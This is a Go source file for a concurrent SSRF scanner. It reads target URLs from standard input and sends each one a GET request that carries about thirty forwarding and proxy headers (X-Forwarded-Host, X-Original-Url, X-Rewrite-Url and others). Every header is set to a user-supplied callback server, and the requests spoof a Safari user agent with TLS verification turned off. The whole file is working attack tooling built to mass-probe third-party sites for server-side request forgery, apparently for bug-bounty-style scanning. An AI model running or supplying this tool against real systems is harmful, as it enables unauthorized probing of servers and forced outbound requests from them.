package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"sync"
	"time"
)

var headers = []string{
	"Proxy-Host", "Request-Uri", "X-Forwarded", "X-Forwarded-By", "X-Forwarded-For",
	"X-Forwarded-For-Original", "X-Forwarded-Host", "X-Forwarded-Server", "X-Forwarder-For",
	"X-Forward-For", "Base-Url", "Http-Url", "Proxy-Url", "Redirect", "Real-Ip", "Referer", "Referer",
	"Referrer", "Refferer", "Uri", "Url", "X-Host", "X-Http-Destinationurl", "X-Http-Host-Override",
	"X-Original-Remote-Addr", "X-Original-Url", "X-Proxy-Url", "X-Rewrite-Url", "X-Real-Ip", "X-Remote-Addr",
}
var transport = &http.Transport{
	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	IdleConnTimeout: time.Second,
	DialContext: (&net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: time.Second,
		DualStack: true,
	}).DialContext,
}

var httpClient = &http.Client{
	Transport: transport,
}

func main() {
	var threads int
	var collab string
	var wg sync.WaitGroup
	urls := make(chan string)
	flag.IntVar(&threads, "t", 20, "Specify number of threads to run")
	flag.StringVar(&collab, "c", "none", "Specify your server address")
	flag.Parse()

	if collab == "none" {
		fmt.Println("Please Specify your server using -c ")
		return
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go workers(urls, collab, &wg)
	}

	input := bufio.NewScanner(os.Stdin)

	go func() {
		for input.Scan() {
			urls <- input.Text()
		}
		close(urls)
	}()

	wg.Wait()
}

func ssrf(s, collab string) {
	request, _ := http.NewRequest("GET", s, nil)
	request.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15")
	for _, i := range headers {
		request.Header.Add(i, collab)
	}
	fmt.Println(request.Header)
	httpClient.Do(request)
}

func workers(cha chan string, collab string, wg *sync.WaitGroup) {
	for i := range cha {
		ssrf(i, collab)
	}
	wg.Done()
}
